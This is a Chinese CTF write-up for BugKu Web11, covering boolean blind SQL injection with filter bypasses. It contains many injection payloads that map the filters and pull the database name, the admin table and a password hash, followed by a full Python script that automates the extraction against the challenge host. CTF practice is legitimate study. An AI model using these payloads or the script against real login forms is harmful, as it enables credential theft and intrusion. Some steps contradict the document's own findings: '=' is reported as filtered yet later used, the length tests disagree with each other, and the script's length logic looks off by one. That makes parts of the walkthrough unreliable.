# BugKu Web11 - SQL注入（布尔盲注）

## 题目信息
- **平台**: [BugKu CTF](https://ctf.bugku.com/)
- **类型**: Web - SQL注入
- **难度**: 4星
- **金币**: 4
- **分数**: 40
- **题目地址**: http://160.202.254.160:16236/index.php
- **提示**: 基于布尔的SQL盲注，有大量过滤

---

## 前置知识

### 什么是布尔盲注？

**普通SQL注入**: 页面直接显示数据库查询结果，你能直接看到数据。

**布尔盲注**: 页面只返回 True/False（如"password error!" vs "username does not exist!"），你需要通过猜测来逐步获取数据。

**基于布尔**: 根据页面返回的内容不同来判断条件是否成立。

---

## 第一步: 手工探测过滤字符

### 1.1 基础测试

打开题目，是一个登录页面，有 username 和 password 两个输入框。

**测试注入点:**

| 输入（username） | 回显 | 分析 |
|:---|:---|:---|
| `1` | `username does not exist!` | 正常，用户不存在 |
| `1'` | `username does not exist!` | 单引号可用，但未触发报错 |
| `admin` | `password error!` | admin用户存在，密码错误 |
| `admin'` | `password error!` | 单引号被包含在查询中 |

**结论**: 存在SQL注入，注入点在 username 字段。

### 1.2 逻辑运算符测试

| 输入（username） | 回显 | 分析 |
|:---|:---|:---|
| `admin' and 1=1#` | `illegal character` | `and` 被过滤 |
| `admin' AND 1=1#` | `illegal character` | `AND` 被过滤 |
| `admin' AnD 1=1#` | `illegal character` | `AnD` 被过滤 |
| `admin' aNd 1=1#` | `illegal character` | `aNd` 被过滤 |
| `admin'&&1>0#` | `password error!` | `&&` 可用！ |
| `admin'||1>0#` | `password error!` | `||` 可用！ |

**结论**: `and`/`AND`/`AnD`/`aNd` 被过滤，但 `&&` 和 `||` 可用。

### 1.3 比较运算符测试

| 输入（username） | 回显 | 分析 |
|:---|:---|:---|
| `admin'&&1=1#` | `illegal character` | `=` 被过滤 |
| `admin'&&1 like 1#` | `illegal character` | `like` 被过滤 |
| `admin'&&1<=>1#` | `illegal character` | `<=>` 被过滤 |
| `admin'&&1>=1#` | `illegal character` | `>=` 被过滤 |
| `admin'&&1<=1#` | `illegal character` | `<=` 被过滤 |
| `admin'&&1!=1#` | `illegal character` | `!=` 被过滤 |
| `admin'&&1 is not 1#` | `illegal character` | `is not` 被过滤 |
| `admin'&&1>0#` | `password error!` | `>` 可用！ |
| `admin'&&1<0#` | `username does not exist!` | `<` 可用！ |
| `admin'&&1<>2#` | `password error!` | `<>` 可用！ |

**结论**: `=`、`like`、`<=>`、`>=`、`<=`、`!=`、`is not` 被过滤，但 `>`、`<`、`<>` 可用。

### 1.4 空格及替代测试

| 输入（username） | 回显 | 分析 |
|:---|:---|:---|
| `admin' && 1>0#` | `illegal character` | 空格被过滤 |
| `admin'/**/&&/**/1>0#` | `illegal character` | `/**/` 被过滤 |
| `admin'+&&+1>0#` | `illegal character` | `+` 被过滤 |
| `admin'&&(1>0)#` | `password error!` | 括号可绕过空格！ |

**结论**: 空格、`/**/`、`+` 被过滤，但可以用括号绕过。

### 1.5 注释符测试

| 输入（username） | 回显 | 分析 |
|:---|:---|:---|
| `admin'&&1>0#` | `password error!` | `#` 可用！ |
| `admin'&&1>0--+` | `illegal character` | `--+` 被过滤 |
| `admin'&&1>0;%00` | `illegal character` | `;%00` 被过滤 |
| `admin'&&1>0-- -` | `illegal character` | `-- -` 被过滤 |
| `admin'&&1>0/*!50000*/` | `illegal character` | `/*!50000*/` 被过滤 |

**结论**: `#` 可用，其他注释符被过滤。

### 1.6 字符串截取函数测试

| 输入（username） | 回显 | 分析 |
|:---|:---|:---|
| `admin'&&ascii(substr(database()from1for1))>0#` | `illegal character` | `for` 被过滤 |
| `admin'&&length(left(database()1))>0#` | `username does not exist!` | `left()` 语法不对 |

**结论**: `for` 被过滤，`substr()` 需要找替代方案。

### 1.7 正则表达式测试

| 输入（username） | 回显 | 分析 |
|:---|:---|:---|
| `admin'&&database()regexp'^s'#` | `username does not exist!` | `regexp` 可用！ |
| `admin'&&database()regexp'^blindsql'#` | `password error!` | 数据库名是 `blindsql`！ |

**结论**: `regexp` 可用，这是本题的关键突破点！

### 1.8 其他过滤发现

| 输入（username） | 回显 | 分析 |
|:---|:---|:---|
| `admin'&&1,1#` | `illegal character` | `,`（逗号）被过滤 |
| `admin'&&information_schema.tables#` | `illegal character` | `information` 被过滤 |
| `admin'&&where#` | `illegal character` | `where` 被过滤 |
| `admin'&&select(*)from(admin)#` | `illegal character` | `*` 被过滤 |

---

## 完整过滤替换表

### 被过滤的字符/关键字

| 类型 | 被过滤的内容 |
|:---|:---|
| **逻辑运算符** | `and`, `AND`, `AnD`, `aNd` |
| **比较运算符** | `=`, `like`, `<=>`, `>=`, `<=`, `!=`, `is not` |
| **空格及替代** | ` `（空格）, `/**/`, `+` |
| **注释符** | `--+`, `;%00`, `-- -`, `/*!50000*/` |
| **字符串截取** | `for`（`substr(...from...for...)`） |
| **其他关键字** | `,`（逗号）, `information`, `where`, `*` |

### 可用的替换方案

| 类型 | 原始 | 可用替换 |
|:---|:---|:---|
| **逻辑运算符** | `and` | `&&`, `||` |
| **比较运算符** | `=` | `>`, `<`, `<>` |
| **空格绕过** | ` ` | `()`（括号） |
| **注释符** | `--+` | `#` |
| **字符串匹配** | `=` / `like` | `regexp` |
| **字符串截取** | `substr(...,i,1)` | `regexp'^pattern'`（逐位匹配） |
| **聚合函数** | `count(*)` | `count(0)` |
| **信息查询** | `information_schema` | 直接猜测表名/列名 |

---

## 第二步: 确认布尔盲注

### 关键测试

| 输入（username） | 回显 | 分析 |
|:---|:---|:---|
| `admin'&&1>0#` | `password error!` | 条件为真（1>0成立） |
| `admin'&&1<0#` | `username does not exist!` | 条件为假（1<0不成立） |
| `admin'&&1<>2#` | `password error!` | 条件为真（1不等于2） |
| `admin'&&1<>1#` | `username does not exist!` | 条件为假（1等于1） |

**判断逻辑**:
- `password error!` = 条件为真（用户名存在，继续判断密码）
- `username does not exist!` = 条件为假（用户名不存在）

---

## 第三步: 获取数据库名

### 3.1 获取数据库名长度

```
admin'&&length(database())>5#      -> password error!（真）
admin'&&length(database())>10#     -> password error!（真）
admin'&&length(database())>8#      -> username does not exist!（假）
admin'&&length(database())=8#      -> password error!（真）
```

**结论**: 数据库名长度为 **8**。

### 3.2 逐位获取数据库名（用 regexp）

```
admin'&&database()regexp'^b'#      -> password error!（真，第1位是b）
admin'&&database()regexp'^bl'#     -> password error!（真，第2位是l）
admin'&&database()regexp'^bli'#    -> password error!（真，第3位是i）
admin'&&database()regexp'^blin'#   -> password error!（真，第4位是n）
admin'&&database()regexp'^blind'#  -> password error!（真，第5位是d）
...
admin'&&database()regexp'^blindsql'# -> password error!（真，完整名blindsql）
```

**结论**: 数据库名为 **blindsql**。

---

## 第四步: 获取表名

由于 `information_schema` 被过滤，无法直接查询所有表名，采用猜测+验证的方式。

### 4.1 猜测常见表名

```
admin'&&(select(count(0))from(flag))>0#     -> username does not exist!（假）
admin'&&(select(count(0))from(users))>0#    -> username does not exist!（假）
admin'&&(select(count(0))from(admin))>0#     -> password error!（真）
```

**结论**: 存在 **admin** 表。

---

## 第五步: 获取 admin 密码

### 5.1 获取密码长度

```
admin'&&length((select(password)from(admin)))>30#  -> password error!（真）
admin'&&length((select(password)from(admin)))>31#  -> password error!（真）
admin'&&length((select(password)from(admin)))>32#  -> username does not exist!（假）
admin'&&length((select(password)from(admin)))=32#  -> password error!（真）
```

**结论**: 密码长度为 **32**，疑似 MD5 哈希。

### 5.2 逐位获取密码（用 regexp）

```
admin'&&(select(password)from(admin))regexp'^4'#       -> password error!（真）
admin'&&(select(password)from(admin))regexp'^4d'#      -> password error!（真）
admin'&&(select(password)from(admin))regexp'^4dc'#     -> password error!（真）
...
admin'&&(select(password)from(admin))regexp'^4dcc88f8f1bc05e7c2ad1a60288481a2'# -> password error!（真）
```

**结论**: 密码为 **4dcc88f8f1bc05e7c2ad1a60288481a2**（32位MD5）。

### 5.3 MD5 解密

使用在线 MD5 解密工具:
- https://www.cmd5.com/
- https://md5.gromweb.com/

输入 `4dcc88f8f1bc05e7c2ad1a60288481a2`，解密得到: **bugkuctf**

---

## 第六步: 登录获取 Flag

**用户名**: `admin`
**密码**: `bugkuctf`

登录后页面显示:
```
Oh you get it
flag{7a4b53c4e3e52ebe488fb97d89c1568d}
```

---

## Python 自动化盲注脚本

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BugKu SQL注入 - 布尔盲注自动化脚本
基于已探测的过滤规则编写，无需再测试过滤
"""

import requests
import string

# 目标URL
URL = "http://160.202.254.160:16236/index.php"

# 可用字符集（根据题目实际flag字符范围调整）
CHARS = string.ascii_lowercase + string.digits + "{_}!@#$%^&*"

# 已确认的布尔判断关键字
TRUE_KEYWORD = "password error"      # 条件为真时的回显
FALSE_KEYWORD = "username does not exist"  # 条件为假时的回显


def check(payload: str) -> bool:
    """
    发送请求，判断条件是否为真

    Args:
        payload: 构造的SQL注入payload（username字段）

    Returns:
        True: 条件成立（页面包含 TRUE_KEYWORD）
        False: 条件不成立（页面包含 FALSE_KEYWORD）
    """
    data = {
        "username": payload,
        "password": "1"  # password字段任意填
    }
    try:
        res = requests.post(URL, data=data, timeout=10)
        return TRUE_KEYWORD in res.text
    except requests.RequestException as e:
        print(f"[!] 请求错误: {e}")
        return False


def get_length(query: str) -> int:
    """
    获取目标字符串长度

    使用二分法快速确定长度，避免逐位遍历

    Args:
        query: SQL查询语句，如 database() 或 (select(password)from(admin))

    Returns:
        字符串长度
    """
    print(f"[*] 正在获取长度: {query}")

    # 先用大步长确定范围
    for max_len in [10, 20, 50, 100]:
        payload = f"admin'&&length({query})>{max_len}#"
        if not check(payload):
            break

    # 二分法精确确定长度
    low, high = 1, max_len
    while low < high:
        mid = (low + high + 1) // 2
        payload = f"admin'&&length({query})>{mid}#"
        if check(payload):
            low = mid
        else:
            high = mid - 1

    length = low + 1
    print(f"[+] 长度: {length}")
    return length


def get_string(query: str, length: int, chars: str = CHARS) -> str:
    """
    逐位获取目标字符串（使用regexp逐位匹配）

    由于逗号被过滤，无法使用 substr(str,i,1)
    改用 regexp'^pattern' 逐位匹配前缀

    Args:
        query: SQL查询语句
        length: 已知的目标字符串长度
        chars: 候选字符集

    Returns:
        完整字符串
    """
    print(f"[*] 正在获取字符串: {query} (长度: {length})")
    result = ""

    for i in range(1, length + 1):
        for char in chars:
            # 构建前缀匹配模式
            pattern = result + char
            payload = f"admin'&&{query}regexp'^{pattern}'#"

            if check(payload):
                result += char
                print(f"[+] 当前进度: {result} ({i}/{length})")
                break
        else:
            # 当前字符集未匹配到，扩展字符集或报错
            print(f"[!] 第{i}位未匹配到字符，当前结果: {result}")
            print(f"[!] 尝试扩展字符集...")
            # 扩展字符集重试
            extended_chars = string.printable.strip()
            for char in extended_chars:
                pattern = result + char
                payload = f"admin'&&{query}regexp'^{pattern}'#"
                if check(payload):
                    result += char
                    print(f"[+] 当前进度: {result} ({i}/{length})")
                    break
            else:
                print(f"[!] 无法匹配第{i}位，终止")
                break

    print(f"[+] 最终结果: {result}")
    return result


def get_database_name() -> str:
    """获取数据库名"""
    length = get_length("database()")
    return get_string("database()", length)


def get_table_name() -> str:
    """
    获取表名

    由于information_schema被过滤，采用猜测+验证的方式
    """
    common_tables = ["flag", "users", "admin", "data", "blind", "sql", "test"]

    print("[*] 猜测常见表名...")
    for table in common_tables:
        payload = f"admin'&&(select(count(0))from({table}))>0#"
        if check(payload):
            print(f"[+] 找到表: {table}")
            return table

    print("[!] 未找到常见表名")
    return ""


def get_password(table: str = "admin") -> str:
    """
    获取指定表的密码字段

    假设表结构为: username, password
    """
    query = f"(select(password)from({table}))"
    length = get_length(query)
    return get_string(query, length)


def main():
    """主函数"""
    print("=" * 60)
    print("BugKu SQL注入 - 布尔盲注自动化脚本")
    print("=" * 60)

    # 1. 获取数据库名
    print("\n[步骤1] 获取数据库名")
    db_name = get_database_name()
    print(f"[+] 数据库名: {db_name}")

    # 2. 获取表名
    print("\n[步骤2] 获取表名")
    table_name = get_table_name()
    if not table_name:
        print("[!] 无法获取表名，退出")
        return

    # 3. 获取密码
    print("\n[步骤3] 获取密码")
    password = get_password(table_name)
    print(f"[+] 密码(MD5): {password}")
    print(f"[+] 密码长度: {len(password)}")

    # 4. 提示解密
    print("\n[步骤4] 解密MD5")
    print(f"[*] 请访问 https://www.cmd5.com/ 解密: {password}")
    print("[*] 解密后使用 admin + 明文密码 登录获取flag")

    print("\n" + "=" * 60)
    print("脚本执行完毕")
    print("=" * 60)


if __name__ == "__main__":
    main()
```

---

## 脚本使用说明

### 运行环境
- Python 3.x
- requests 库: `pip install requests`

### 运行方式
```bash
python sql_blind.py
```

### 输出示例
```
============================================================
BugKu SQL注入 - 布尔盲注自动化脚本
============================================================

[步骤1] 获取数据库名
[*] 正在获取长度: database()
[+] 长度: 8
[*] 正在获取字符串: database() (长度: 8)
[+] 当前进度: b (1/8)
[+] 当前进度: bl (2/8)
...
[+] 最终结果: blindsql
[+] 数据库名: blindsql

[步骤2] 获取表名
[*] 猜测常见表名...
[+] 找到表: admin

[步骤3] 获取密码
[*] 正在获取长度: (select(password)from(admin))
[+] 长度: 32
[*] 正在获取字符串: (select(password)from(admin)) (长度: 32)
[+] 当前进度: 4 (1/32)
[+] 当前进度: 4d (2/32)
...
[+] 最终结果: 4dcc88f8f1bc05e7c2ad1a60288481a2
[+] 密码(MD5): 4dcc88f8f1bc05e7c2ad1a60288481a2
[+] 密码长度: 32

[步骤4] 解密MD5
[*] 请访问 https://www.cmd5.com/ 解密: 4dcc88f8f1bc05e7c2ad1a60288481a2
[*] 解密后使用 admin + 明文密码 登录获取flag

============================================================
脚本执行完毕
============================================================
```

---

## 涉及知识点

| 知识点 | 说明 |
|:---|:---|
| **布尔盲注** | 通过页面回显的 True/False 判断条件是否成立 |
| **SQL过滤绕过** | 使用替代关键字（`&&`代替`and`，`>`代替`=`） |
| **空格绕过** | 使用括号 `()` 代替空格 |
| **正则匹配** | 使用 `regexp` 进行字符串前缀匹配 |
| **MD5解密** | 32位哈希值的在线解密 |

---

## 参考

- [BugKu CTF 平台](https://ctf.bugku.com/)
- [SQL注入 - 布尔盲注](https://www.freebuf.com/articles/web/183579.html)
- [MD5 在线解密](https://www.cmd5.com/)
